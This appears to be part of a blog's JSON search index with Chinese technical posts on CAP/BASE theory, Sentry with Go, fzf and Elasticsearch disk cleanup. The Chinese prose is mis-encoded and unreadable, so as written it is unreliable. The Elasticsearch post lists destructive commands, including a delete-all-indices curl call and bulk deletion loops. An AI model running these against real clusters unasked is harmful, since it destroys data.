ä¿¡æ¯çœ‹ä¸åˆ°ï¼Œä½†æ˜¯å·²æœ‰çš„ä¼˜æƒ è¦ä¿è¯å¯ç”¨ï¼Œè€Œä¸”ä¼˜æƒ å¯ä»¥æå‰é¢„è®¡ç®—ï¼Œæ‰€ä»¥å¯ä»¥ä¿è¯APã€‚\n6. æ”¯ä»˜è¿™ä¸€å—æ˜¯ç‹¬ç«‹çš„ç³»ç»Ÿï¼Œæˆ–è€…ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„æ”¯ä»˜å®ï¼Œå¾®ä¿¡ã€‚å…¶å®CAPæ˜¯ç”±ç¬¬ä¸‰æ–¹æ¥ä¿è¯çš„ï¼Œæ”¯ä»˜ç³»ç»Ÿæ˜¯ä¸€ä¸ªå¯¹CAPè¦æ±‚æé«˜çš„ç³»ç»Ÿï¼ŒCæ˜¯å¿…é¡»è¦ä¿è¯çš„ï¼ŒAPä¸­Aç›¸å¯¹æ›´é‡è¦ï¼Œä¸èƒ½å› ä¸ºåˆ†åŒºï¼Œå¯¼è‡´æ‰€æœ‰äººéƒ½ä¸èƒ½æ”¯ä»˜ã€‚\n\n\n\n# 3. APä¸‹çš„ BASE ç†è®º\n\n CAP ä¸å¯èƒ½åŒæ—¶æ»¡è¶³ï¼Œè€Œ`åˆ†åŒºå®¹é”™æ€§(P)`æ˜¯å¯¹äºåˆ†å¸ƒå¼ç³»ç»Ÿè€Œè¨€æ˜¯å¿…é¡»çš„ã€‚å¦‚æœç³»ç»Ÿèƒ½å¤ŸåŒæ—¶å®ç° CAP æ˜¯å†å¥½ä¸è¿‡çš„äº†ï¼Œæ‰€ä»¥å‡ºç°äº† BASE ç†è®ºï¼ŒBASE æ˜¯ CAP ç†è®ºä¸­ AP æ–¹æ¡ˆçš„å»¶ä¼¸ã€‚\n\n### 3.1 BASE ç†è®º\n\nBASE æ˜¯ Basically Availableï¼ˆåŸºæœ¬å¯ç”¨ï¼‰ ã€Soft-stateï¼ˆè½¯çŠ¶æ€ï¼‰ å’Œ Eventually Consistentï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰ ä¸‰ä¸ªçŸ­è¯­çš„ç¼©å†™ã€‚\n\næ ¸å¿ƒæ€æƒ³:\nå³ä½¿æ— æ³•åšåˆ°å¼ºä¸€è‡´æ€§ï¼Œä½†æ¯ä¸ªåº”ç”¨éƒ½å¯ä»¥æ ¹æ®è‡ªèº«ä¸šåŠ¡ç‰¹ç‚¹ï¼Œé‡‡ç”¨é€‚å½“çš„æ–¹å¼æ¥ä½¿ç³»ç»Ÿè¾¾åˆ°æœ€ç»ˆä¸€è‡´æ€§ã€‚\n\n### 3.2 ACIDå’ŒBASE\n\nä¸¤ä¸ªå¯¹å†²ç†å¿µï¼šACIDå’ŒBASEã€‚\n\nACIDæ˜¯ä¼ ç»Ÿæ•°æ®åº“å¸¸ç”¨çš„è®¾è®¡ç†å¿µï¼Œè¿½æ±‚å¼ºä¸€è‡´æ€§æ¨¡å‹ã€‚\n\nBASEæ”¯æŒçš„æ˜¯å¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œæå‡ºé€šè¿‡ç‰ºç‰²å¼ºä¸€è‡´æ€§è·å¾—é«˜å¯ç”¨æ€§ã€‚\n\n### 3.3 Basically Available(åŸºæœ¬å¯ç”¨)\n\nå®é™…ä¸Šå°±æ˜¯ä¸¤ä¸ªå¦¥åã€‚\n\n+ å¯¹å“åº”ä¸Šæ—¶é—´çš„å¦¥åï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸€ä¸ªåœ¨çº¿æœç´¢å¼•æ“éœ€è¦åœ¨0.5ç§’ä¹‹å†…è¿”å›ç»™ç”¨æˆ·ç›¸åº”çš„æŸ¥è¯¢ç»“æœï¼Œä½†ç”±äºå‡ºç°æ•…éšœï¼ˆæ¯”å¦‚ç³»ç»Ÿéƒ¨åˆ†æœºæˆ¿å‘ç”Ÿæ–­ç”µæˆ–æ–­ç½‘æ•…éšœï¼‰ï¼ŒæŸ¥è¯¢ç»“æœçš„å“åº”æ—¶é—´å¢åŠ åˆ°äº†1~2ç§’ã€‚\n\n+ å¯¹åŠŸèƒ½æŸå¤±çš„å¦¥åï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œåœ¨ä¸€ä¸ªç”µå­å•†åŠ¡ç½‘ç«™ï¼ˆæ¯”å¦‚æ·˜å®ï¼‰ä¸Šè´­ç‰©ï¼Œæ¶ˆè´¹è€…å‡ ä¹èƒ½å¤Ÿé¡ºåˆ©åœ°å®Œæˆæ¯ä¸€ç¬”è®¢å•ã€‚ä½†åœ¨ä¸€äº›èŠ‚æ—¥å¤§ä¿ƒè´­ç‰©é«˜å³°çš„æ—¶å€™ï¼ˆæ¯”å¦‚åŒåä¸€ã€åŒåäºŒï¼‰ï¼Œç”±äºæ¶ˆè´¹è€…çš„è´­ç‰©è¡Œä¸ºæ¿€å¢ï¼Œä¸ºäº†ä¿æŠ¤ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼ˆæˆ–è€…ä¿è¯ä¸€è‡´æ€§ï¼‰ï¼Œéƒ¨åˆ†æ¶ˆè´¹è€…å¯èƒ½ä¼šè¢«å¼•å¯¼åˆ°ä¸€ä¸ªé™çº§é¡µé¢ã€‚\n\n### 3.4 Soft stateï¼ˆè½¯çŠ¶æ€ï¼‰\n\n- åŸå­æ€§ï¼ˆç¡¬çŠ¶æ€ï¼‰ -> è¦æ±‚å¤šä¸ªèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬éƒ½æ˜¯ä¸€è‡´çš„,è¿™æ˜¯ä¸€ç§\"ç¡¬çŠ¶æ€\"\n\n  <img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/143-Base2.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n- è½¯çŠ¶æ€ï¼ˆå¼±çŠ¶æ€ï¼‰ -> å…è®¸ç³»ç»Ÿä¸­çš„æ•°æ®å­˜åœ¨ä¸­é—´çŠ¶æ€,å¹¶è®¤ä¸ºè¯¥çŠ¶æ€ä¸å½±å“ç³»ç»Ÿçš„æ•´ä½“å¯ç”¨æ€§,å³å…è®¸ç³»ç»Ÿåœ¨å¤šä¸ªä¸åŒèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬å­˜åœ¨æ•°æ®å»¶è¿Ÿã€‚\n\n  <img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/144-Base2.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n### 3.5 Eventually consistentï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰\n\nä¸Šé¢è¯´è½¯çŠ¶æ€ï¼Œç„¶åä¸å¯èƒ½ä¸€ç›´æ˜¯è½¯çŠ¶æ€ï¼Œå¿…é¡»æœ‰ä¸ªæ—¶é—´æœŸé™ã€‚åœ¨æœŸé™è¿‡åï¼Œåº”å½“ä¿è¯æ‰€æœ‰å‰¯æœ¬ä¿æŒæ•°æ®ä¸€è‡´æ€§ã€‚ä»è€Œè¾¾åˆ°æ•°æ®çš„æœ€ç»ˆä¸€è‡´æ€§ã€‚è¿™ä¸ªæ—¶é—´æœŸé™å–å†³äºç½‘ç»œå»¶æ—¶ï¼Œç³»ç»Ÿè´Ÿè½½ï¼Œæ•°æ®å¤åˆ¶æ–¹æ¡ˆè®¾è®¡ç­‰ç­‰å› ç´ ã€‚\n\n<img src=\"åˆ†å¸ƒå¼CAPå’ŒBASEç†è®º/145-Base3.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\nç¨å¾®å®˜æ–¹ä¸€ç‚¹çš„è¯´æ³•å°±æ˜¯ï¼š\n\nç³»ç»Ÿèƒ½å¤Ÿä¿è¯åœ¨æ²¡æœ‰å…¶ä»–æ–°çš„æ›´æ–°æ“ä½œçš„æƒ…å†µä¸‹ï¼Œæ•°æ®æœ€ç»ˆä¸€å®šèƒ½å¤Ÿè¾¾åˆ°ä¸€è‡´çš„çŠ¶æ€ï¼Œå› æ­¤æ‰€æœ‰å®¢æˆ·ç«¯å¯¹ç³»ç»Ÿçš„æ•°æ®è®¿é—®æœ€ç»ˆéƒ½èƒ½å¤Ÿè·å–åˆ°æœ€æ–°çš„å€¼ã€‚\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/savorboard/p/distributed-system-transaction-consistency.html\n+ https://github.com/Snailclimb/JavaGuide/blob/master/docs/system-design/distributed-system/CAP%E7%90%86%E8%AE%BA.md\n+ https://github.com/aceld/golang/blob/main/2%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%8EACID%E3%80%81CAP%E3%80%81BASE%E7%9A%84%E7%90%86%E8%AE%BA%E6%8E%A8%E8%BF%9B.md\n\n","tags":["åˆ†å¸ƒå¼"],"categories":["åˆ†å¸ƒå¼"]},{"title":"sentryç›‘æ§ä¸golangçš„ä½¿ç”¨","url":"%2Fp%2F2f428470.html","content":"\nSentry æ˜¯ä¸€ä¸ªå¼€æºçš„éå¸¸å¼ºå¤§çš„å®æ—¶å¼‚å¸¸æ”¶é›†ç³»ç»Ÿï¼Œå¯ä»¥ä¸ºå¼€å‘è€…çš„æä¾›å¸®åŠ©ã€è¯Šæ–­ï¼Œä¿®å¤å’Œä¼˜åŒ–å…¶ä»£ç çš„æ€§èƒ½çš„èƒ½åŠ›ï¼Œå¯ä»¥ç”¨å®ƒæ¥ç›‘æ§çº¿ä¸ŠæœåŠ¡çš„å¥åº·çŠ¶æ€ï¼Œå®æ—¶æ”¶é›†çš„å¼‚å¸¸å †æ ˆä¿¡æ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿå‘ç°ã€å®šä½å’Œä¿®å¤é—®é¢˜ã€‚\n\n<!-- more -->\n\n\n# 1. å®‰è£…ä½¿ç”¨\n\n### 1.1 å®‰è£…\n\n```bash\ngit clone https://github.com/getsentry/self-hosted sentry\nsudo ./install.sh\nsudo docker-compose up -d\n```\n\n<img src=\"sentryç›‘æ§ä¸golangçš„ä½¿ç”¨/image-20220727112838445.png\" alt=\"image-20220727112838445\" style=\"zoom: 25%;\" />\n\n+ æŠ¥é”™\n\n  â–¶ Detecting Docker platform\n  panic: reflect: indirection through nil pointer to embedded struct [recovered]\n\n  ```bash\n  # ç¡®è®¤ä¸‹dockerå’Œdocker-composeç‰ˆæœ¬æ˜¯å¦æ»¡è¶³\n  sudo curl -L https://github.com/docker/compose/releases/download/v2.7.0/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose\n  \n  sudo chmod +x /usr/local/bin/docker-compose\n  ```\n\n\n\n### 1.2 åˆ›å»ºé¡¹ç›®\n\n+ è®¿é—®9000ç«¯å£ï¼Œåˆ›å»ºç”¨æˆ·ï¼Œè¿™æ—¶å€™ä¸€å®šè¦æ”¾å¼€æ³¨å†Œã€‚\n\n + create project\n + Go é¡¹ç›®\n\n\n\n### 1.3 é…ç½®é‚®ç®±\n\n```bash\nsudo docker-compose down\nsudo docker-compose build --force-rm\nsudo docker-compose run --rm web upgrade\nsudo docker-compose up -d\n```\n\nè¿›å…¥é¡µé¢ï¼Œåœ¨å·¦ä¸Šè§’çš„ä½ çš„æ˜µç§°ä½ç½®å•å‡»ï¼Œé€‰æ‹©Adminã€‚\n\nç„¶ååœ¨å·¦ä¾§é€‰æ‹©**Mail**ï¼Œç„¶ååœ¨æœ€ä¸‹é¢æœ‰ä¸€ä¸ªæµ‹è¯•è®¾ç½®ã€‚ç‚¹å‡»â€œå‘é€ä¸€å°æµ‹è¯•é‚®ä»¶â€ã€‚å¦‚æœæ”¶åˆ°çš„è¯ï¼Œé‚£ä¹ˆè¯´æ˜å°±é…ç½®æˆåŠŸäº†ã€‚\n\n\n\n# 2. ä»£ç \n\n### 2.1 æ·»åŠ ä¸­é—´ä»¶\n\n```go\nimport\tsentrygin \"github.com/getsentry/sentry-go/gin\"\n\nappEngine.Use(sentrygin.New(sentrygin.Options{}))\nappEngine.Use(sentry.CaptureSentryMiddleware)\n\n\n\nfunc Init() {\n\t//TODO: DSN é…ç½®\n\terr := sentry.Init(sentry.ClientOptions{\n\t\tDsn: \"http://1ccf51b1319f49c48e95cb56b7dc8fc4@192.168.40.98:9000/2\",\n\t\t// Set TracesSampleRate to 1.0 to capture 100%\n\t\t// of transactions for performance monitoring.\n\t\t// We recommend adjusting this value in production,\n\t\tTracesSampleRate: 1.0,\n\t})\n\tif err != nil {\n\t\tlqlog.Info(\"sentry init err:%v\", err)\n\t\treturn\n\t}\n\treturn\n}\n```\n\n### 2.2 ä¸ŠæŠ¥\n\n```go\npackage sentry\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\n\t\"github.com/getsentry/sentry-go\"\n\tsentrygin \"github.com/getsentry/sentry-go/gin\"\n\t\"github.com/gin-gonic/gin\"\n)\n\ntype bodyLogWriter struct {\n\tgin.ResponseWriter\n\tbody *bytes.Buffer\n}\n\nfunc (w bodyLogWriter) Write(b []byte) (int, error) {\n\tw.body.Write(b)\n\treturn w.ResponseWriter.Write(b)\n}\n\nfunc CaptureSentryMiddleware(ctx *gin.Context) {\n\tblw := &bodyLogWriter{body: bytes.NewBufferString(\"\"), ResponseWriter: ctx.Writer}\n\tctx.Writer = blw\n\n\thub := sentrygin.GetHubFromContext(ctx)\n\tif hub == nil {\n\t\treturn\n\t}\n\thub.Scope().SetRequest(ctx.Request)\n\n\tctx.Next()\n\n\tstatusCode := ctx.Writer.Status()\n\tif statusCode >= 400 {\n\t\thub.WithScope(func(scope *sentry.Scope) {\n\t\t\tscope.SetExtra(\"code\", statusCode)\n\t\t\thub.CaptureMessage(blw.body.String())\n\t\t})\n\n\t} else if statusCode == 200 {\n\t\tresp := struct {\n\t\t\tErrCode    int64  `json:\"errCode\"`\n\t\t\tErrMsg     string `json:\"errMsg\"`\n\t\t\tErrMsgDesc string `json:\"errMsgDesc\"`\n\t\t}{}\n\t\t_ = json.Unmarshal([]byte(blw.body.String()), &resp)\n\t\tif resp.ErrCode != 0 {\n\t\t\thub.WithScope(func(scope *sentry.Scope) {\n\t\t\t\tscope.SetExtra(\"resp\", blw.body.String())\n\t\t\t\thub.CaptureMessage(ctx.Request.RequestURI)\n\t\t\t})\n\t\t}\n\t}\n}\n\n```\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://docs.sentry.io/platforms/go/\n+ https://zhuanlan.zhihu.com/p/293863914\n+ https://juejin.cn/post/7021804166771113998","tags":["sentry"],"categories":["è½¯ä»¶"]},{"title":"fzfç»ˆç«¯æ¨¡ç³Šæœç´¢ç¥å™¨","url":"%2Fp%2Fa0700771.html","content":"\nfzfæ˜¯ä¸€ä¸ªé€šç”¨çš„å‘½ä»¤è¡Œæ¨¡ç³ŠæŸ¥æ‰¾å™¨, é€šè¿‡è¾“å…¥æ¨¡ç³Šçš„å…³é”®è¯å°±å¯ä»¥å®šä½æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ã€‚ç»“åˆå…¶ä»–å·¥å…·(æ¯”å¦‚rg)å¯ä»¥å®Œæˆéå¸¸å¤šçš„å·¥ä½œï¼Œåœ¨å·¥ä½œä¸­å¯ä»¥å¤§å¹…æé«˜ä½ çš„å·¥ä½œæ•ˆç‡ã€‚\n\nfzfå¯ä»¥ç”¨äºæ–‡ä»¶ã€å‘½ä»¤å†å²è®°å½•ã€è¿›ç¨‹ã€ä¸»æœºåã€ä¹¦ç­¾ã€gitæäº¤ç­‰ã€‚\n\n<!-- more -->\n\n# 1. fzfä½¿ç”¨\n\n### 1.1 å®‰è£…\n\n\n```bash\ngit clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf\n~/.fzf/install\nsource ~/.zshrc  \n```\n\n### 1.2 ä½¿ç”¨\n\nå®‰è£…å, å¯ä»¥æ‰§è¡Œä¸‹`fzf`, å…ˆä½“éªŒä¸‹, å¦å¤– fzf é‡å†™äº† `ctrl+r` æœç´¢å†å²å‘½ä»¤\n\n![image-20210318231127907](fzfç»ˆç«¯æ¨¡ç³Šæœç´¢ç¥å™¨/image-20210318231127907.png)\n\n```bash\nvim $(fzf)  # æœç´¢å, å›è½¦ç›´æ¥ç”¨ vi æ‰“å¼€\nvim $(fzf --height 40%) # é«˜åº¦40%æ‰“å¼€\n```\n\n+ æœç´¢è¿‡ç¨‹ä¸­, CTRL-J å’Œ CTRL-K å‘ä¸Šç¿»å’Œå‘ä¸‹ç¿»\n\n+ bashå’Œzshçš„æ¨¡ç³Šå®Œå¤‡, é»˜è®¤è§¦å‘æ˜¯`**`,  ä¾‹å¦‚: `vim **<TAB>`, æˆ– `cd **<TAB>`, æˆ– `ssh **<TAB>`, ç®€ç›´å¥½ç”¨åˆ°é£èµ·.\n\n  ![image-20210318000439297](fzfç»ˆç«¯æ¨¡ç³Šæœç´¢ç¥å™¨/1.png)\n\n+ ä¸€è¾¹æŸ¥ä¸€è¾¹é¢„è§ˆ\n\n  ```bash\n  fzf --preview 'cat {}'\n  ```\n\n+ å¯ä»¥é…åˆç®¡é“ä½¿ç”¨\n\n  ```bash\n  ps -ef | fzf\n  seq 100 | fzf\n  history | fzf\n  ```\n\n  \n\n### 1.3 æœç´¢è¯­æ³•\n\n| Token     | Match type                 | Description                          |\n| --------- | -------------------------- | ------------------------------------ |\n| `sbtrkt`  | fuzzy-match                | Items that match `sbtrkt`            |\n| `'wild`   | exact-match (quoted)       | Items that include `wild`            |\n| `^music`  | prefix-exact-match         | Items that start with `music`        |\n| `.mp3$`   | suffix-exact-match         | Items that end with `.mp3`           |\n| `!fire`   | inverse-exact-match        | Items that do not include `fire`     |\n| `!^music` | inverse-prefix-exact-match | Items that do not start with `music` |\n| `!.mp3$`  | inverse-suffix-exact-match | Items that do not end with `.mp3`    |\n\n\n\n### 1.4 å’Œtmuxç»“åˆ\n\nfzf å®‰è£…åè‡ªå¸¦ä¸€ä¸ª fzf-tmux, ä½†æ˜¯ä¼šæ–°å¼€ä¸€ä¸ª panel ,å¹¶ä¸æ˜¯å¾ˆå¥½ç”¨,  å»ºè®®ä»¥å¼¹çª—å½¢æˆå¼¹å‡º\n\nå‚è€ƒ: https://www.liuvv.com/p/1104a363.html#3-fzf-tmux\n\n\n\n### 1.5 æ‰“å¼€æ–‡ä»¶\n\nzsh å¢åŠ ä»¥ä¸‹å‡½æ•°, ctrl-o ç”¨ open æ‰“å¼€, ctrl-e ç”¨ vim æ‰“å¼€\n\n```bash\n# Modified version where you can press\n#   - CTRL-O to open with `open` command,\n#   - CTRL-E or Enter key to open with the $EDITOR\nfo() {\n  IFS=$'\\n' out=(\"$(fzfp --preview 'cat {}' --query=\"$1\" --exit-0 --expect=ctrl-o,ctrl-e)\")\n  key=$(head -1 <<< \"$out\")\n  file=$(head -2 <<< \"$out\" | tail -1)\n  if [ -n \"$file\" ]; then\n    [ \"$key\" = ctrl-o ] && open \"$file\" || ${EDITOR:-vim} \"$file\"\n  fi\n}\n```\n\n![image-20210318231156159](fzfç»ˆç«¯æ¨¡ç³Šæœç´¢ç¥å™¨/image-20210318231156159.png)\n\n### 1.6 åˆ‡æ¢ç›®å½•\n\nzsh å¢åŠ ä»¥ä¸‹å‡½æ•°\n\n```bash\n# cd to selected directory\nfd() {\n  local dir\n  dir=$(find ${1:-.} -path '*/\\.*' -prune \\\n                  -o -type d -print 2> /dev/null | fzfp +m) &&\n  cd \"$dir\"\n}\n```\n\n\n\n### 1.7 æœç´¢æ–‡ä»¶å†…å®¹\n\nzsh å¢åŠ ä»¥ä¸‹å‡½æ•°, éœ€è¦é…åˆ `rg`å‘½ä»¤\n\n```bash\n#find-in-file - usage: fif <searchTerm>\nfif() {\n  if [ ! \"$#\" -gt 0 ]; then echo \"Need a string to search for!\"; return 1; fi\n  rg --files-with-matches --no-messages \"$1\" | fzf --preview \"highlight -O ansi -l {} 2> /dev/null | rg --colors 'match:bg:yellow' --ignore-case --pretty --context 10 '$1' || rg --ignore-case --pretty --context 10 '$1' {}\"\n}\n```\n\n\n\n# 2. vimä½¿ç”¨fzf\n\n### 2.1 å®‰è£…\n\n```bash\nPlug 'junegunn/fzf', { 'do': { -> fzf#install() } } \"æé™æœç´¢æ–‡ä»¶\nPlug 'junegunn/fzf.vim'\nnnoremap <leader>fo :Files<CR>\"æ˜ å°„\nnnoremap <leader>fif :Rg<CR> \"æ˜ å°„\n```\n\n### 2.2 ä½¿ç”¨\n\n`:Files`\n\n![image-20210318230744605](fzfç»ˆç«¯æ¨¡ç³Šæœç´¢ç¥å™¨/2.png)\n\n`:Rg`\n\n![image-20210318230855552](fzfç»ˆç«¯æ¨¡ç³Šæœç´¢ç¥å™¨/3.png)\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://github.com/junegunn/fzf\n+ https://github.com/junegunn/fzf/wiki/Examples\n+ https://github.com/junegunn/fzf.vim","tags":["fzf"],"categories":["è½¯ä»¶"]},{"title":"elasticsearchçš„ç£ç›˜æ¸…ç†","url":"%2Fp%2F4171ca07.html","content":"\n# 1. åŸºç¡€å‘½ä»¤\n\n### 1.1 æŸ¥çœ‹å¥åº·\n\n```bash\n# æŸ¥çœ‹å¥åº·\ncurl -XGET 'http://localhost:9200/_cat/health?v'\nâ€‹\nepoch Â  Â   timestamp cluster Â  Â  Â  status node.total node.data shards pri relo init unassign pending_tasks max_task_wait_time active_shards_percent\nâ€‹\n1675044251 02:04:11 elasticsearch yellow Â  Â  Â  Â  Â 1 Â  Â  Â  Â  1 Â  Â  83 Â 83 Â  Â 0 Â  Â 0 Â  Â  Â  69 Â  Â  Â  Â  Â  Â  0 Â  Â  Â  Â  Â  Â  Â  Â  Â - Â  Â  Â  Â  Â  Â  Â  Â  54.6%\nâ€‹\nç»¿è‰²è¡¨ç¤ºä¸€åˆ‡æ­£å¸¸, é»„è‰²è¡¨ç¤ºæ‰€æœ‰çš„æ•°æ®å¯ç”¨ä½†æ˜¯éƒ¨åˆ†å‰¯æœ¬è¿˜æ²¡æœ‰åˆ†é…,çº¢è‰²è¡¨ç¤ºéƒ¨åˆ†æ•°æ®å› ä¸ºæŸäº›åŸå› ä¸å¯ç”¨.\n```\n\n<!-- more -->\n\n### 1.2 æŸ¥çœ‹èŠ‚ç‚¹å’Œç´¢å¼•\n\n```bash\n# æŸ¥çœ‹èŠ‚ç‚¹\ncurl 'localhost:9200/_cat/nodes?v'\n\n\nip        heap.percent ram.percent cpu load_1m load_5m load_15m node.role   master name\n127.0.0.1           35          97  62    3.89    3.74     3.74 cdfhilmrstw *      ip-172-31-31-250\n\n\n# æŸ¥çœ‹æ‰€æœ‰ç´¢å¼•\ncurl 'localhost:9200/_cat/indices?v&pretty'\n\n\nhealth status index                           uuid                   pri rep docs.count docs.deleted store.size pri.store.size\nyellow open   filebeat-7.12.0-2022.11.30      Ax1f5QezQHqIuOzNEZGeOg   1   1    1951589            0    751.4mb        751.4mb\ngreen  open   .kibana_task_manager_7.17.7_001 zXfuQUdyRK6GGy5XXSnF3w   1   0         17       381589     41.5mb         41.5mb\nyellow open   filebeat-7.12.0-2022.12.01      7S1VPbvTRA6uKaTjtb3e5g   1   1    2270280            0    881.1mb        881.1mb\nyellow open   filebeat-7.12.0-2022.12.02      ik_EIJx2SaCHmI4MwxZM7A   1   1    2967501            0      1.1gb          1.1gb\n```\n\n### 1.3 æŸ¥çœ‹ç£ç›˜å ç”¨\n\n```bash\n# æŸ¥çœ‹å ç”¨åˆ—è¡¨\ncurl -XGET \"http://localhost:9200/_cat/shards?v\" Â \nâ€‹\nindex Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  shard prirep state Â  Â  Â  Â   docs Â  store ip Â  Â  Â  Â node\nfilebeat-7.12.0-2022.12.17 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 0 Â  Â  p Â  Â   STARTED Â  Â 16922173 Â  6.9gb 127.0.0.1 ip-172-31-31-250\n\n\n# æŸ¥çœ‹å ç”¨\ncurl -XGET 'http://localhost:9200/_cat/allocation?v'\nâ€‹\n83 Â  Â  Â 291.9gb Â  403.8gb Â  Â  80.8gb Â  Â 484.6gb Â  Â  Â  Â  Â  83 127.0.0.1 127.0.0.1 ip-172-31-31-250\n69 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  UNASSIGNED\n\n\n# æŸ¥çœ‹ç£ç›˜\nsudo du -hs /var/lib/elasticsearch/\n\n292G    /var/lib/elasticsearch/\n```\n\n# 2. ç´¢å¼•å‘½ä»¤\n\nè®¿é—®Â **Elasticsearch**Â ä¸­çš„æ•°æ®çš„Â **pattern**ï¼ˆæ¨¡å¼ï¼‰ã€‚è¯¥Â **pattern**ï¼ˆæ¨¡å¼ï¼‰å¯ä»¥æ¦‚æ‹¬å¦‚ä¸‹ :\n\n```\n<REST Verb> /<Index>/<Type>/<ID>\n```\n\n### 2.1 ç´¢å¼•æ“ä½œ\n\n```bash\n# 1. åˆ›å»º customer ç´¢å¼•\ncurl -XPUT 'localhost:9200/customer?pretty&pretty'\n\n{\n  \"acknowledged\" : true,\n  \"shards_acknowledged\" : true,\n  \"index\" : \"customer\"\n}\n\n\n# 2. è·å–æ‰€æœ‰ç´¢å¼•ï¼Œèƒ½å¤Ÿçœ‹åˆ°æ–°åˆ›å»ºçš„\ncurl -XGET 'localhost:9200/_cat/indices?v&pretty'\nyellow open   customer                        oByO4i3IT96RAHiAyaYc4g   1   1          0            0       226b           226b\n\n\n# 3. å¾€ customer ç´¢å¼•å¢åŠ  external ç±»å‹ id ä¸º 1 çš„æ•°æ®\ncurl -XPUT 'localhost:9200/customer/external/1?pretty&pretty' -H 'Content-Type: application/json' -d'{ \"name\": \"John Doe\" }'\n\n{\n  \"_index\" : \"customer\",\n  \"_type\" : \"external\",\n  \"_id\" : \"1\",\n  \"_version\" : 1,\n  \"result\" : \"created\",\n  \"_shards\" : {\n    \"total\" : 2,\n    \"successful\" : 1,\n    \"failed\" : 0\n  },\n  \"_seq_no\" : 0,\n  \"_primary_term\" : 1\n}\n\n\n# 4. ä»ç´¢å¼•æŸ¥è¯¢æ•°æ®\ncurl -XGET 'localhost:9200/customer/external/1?pretty&pretty'\n\n{\n  \"_index\" : \"customer\",\n  \"_type\" : \"external\",\n  \"_id\" : \"1\",\n  \"_version\" : 1,\n  \"_seq_no\" : 0,\n  \"_primary_term\" : 1,\n  \"found\" : true,\n  \"_source\" : {\n    \"name\" : \"John Doe\"\n  }\n}\n\n```\n\n### 2.2 åˆ é™¤ç´¢å¼•\n\n```bash\n# 1. åˆ é™¤ä¸€ä¸ªç´¢å¼•\ncurl -XDELETE 'localhost:9200/customer?pretty&pretty'\n{\n  \"acknowledged\" : true\n}\n\n# 2. è·å–æ‰€æœ‰ç´¢å¼•\ncurl -XGET 'localhost:9200/_cat/indices?v&pretty'\n\n\n# 3. åˆ é™¤æ‰€æœ‰æ•°æ®[è°¨æ…]\ncurl -XDELETE 'http://localhost:9200/_all'\n```\n\n# 3. æ¸…ç†ç£ç›˜\n\n### 3.1 åˆ é™¤ç´¢å¼•æ“ä½œ\n\n```bash\n# 1. åˆ é™¤ä¸€äº›ç´¢å¼•\ncurl -XDELETE 'localhost:9200/filebeat-7.12.0-2022.11.30?pretty'\ncurl -XDELETE 'localhost:9200/filebeat-7.12.0-2022.12.01?pretty'\ncurl -XDELETE 'localhost:9200/filebeat-7.12.0-2022.12.02?pretty'\ncurl -XDELETE 'localhost:9200/filebeat-7.12.0-2022.12.03?pretty'\n\n# 2. è·å–ç´¢å¼•åˆ—è¡¨\ncurl -XGET 'localhost:9200/_cat/indices?v&pretty'\n\n# 3. è·å–ç£ç›˜å ç”¨\n\nshards disk.indices disk.used disk.avail disk.total disk.percent host      ip        node\n    73      276.9gb   389.3gb     95.3gb    484.6gb           80 127.0.0.1 127.0.0.1 ip-172-31-31-250\n    59                                                                               UNASSIGNED\n\n```\n\n### 3.2 æ‰¹é‡åˆ é™¤æ“ä½œ\n\n```bash\n# 1. è·å–è¦åˆ é™¤çš„ç´¢å¼•\ncurl -XGET 'localhost:9200/_cat/shards' |awk '{print $1}' | grep filebeat| grep 2022 | uniq > /tmp/index_name.tmp\n\n# 2. å¾ªç¯åˆ é™¤\nfor i in $(cat /tmp/index_name.tmp);do curl -XDELETE http://localhost:9200/$i;done\n\n# 3. æŸ¥è¯¢ç£ç›˜å ç”¨\ncurl -XGET 'http://localhost:9200/_cat/allocation?v'\n```\n\n### 3.3 å¾ªç¯åˆ é™¤è„šæœ¬\n\n`vim /home/scripts/del_elasticseatch_index.sh`\n\n```bash\n#!/bin/bash\n#The index 30 days ago\ncurl -XGET 'http://localhost:9200/_cat/shards' |awk '{print $1}' |grep `date -d \"30 days ago\" +%Y.%m.%d` |uniq > /tmp/index_name.tmp\n\nfor index_name in `cat /tmp/index_name.tmp`  \ndo\n    curl -XDELETE  http://localhost:9200/$index_name\n    echo \"${index_name} delete success\" >> /home/scripts/del_elasticseatch_index.log\ndone\n\n```\n\n```bash\ncrontab -l\n0 3 * * * bash /home/scripts/del_elasticseatch_index.sh\n```\n\n\n\n# 4. å‚è€ƒæ–‡æ¡£\n\n- https://doc.codingdict.com/elasticsearch\n- https://cloud.tencent.com/developer/article/1372542\n","tags":["elasticsearch"],"categories":["elk"]},{"title":"golangåº“gormä¸­mysqlåˆ†è¡¨çš„ä½¿ç”¨","url":"%2Fp%2F4d89fe00.html","content":"\n# 1. 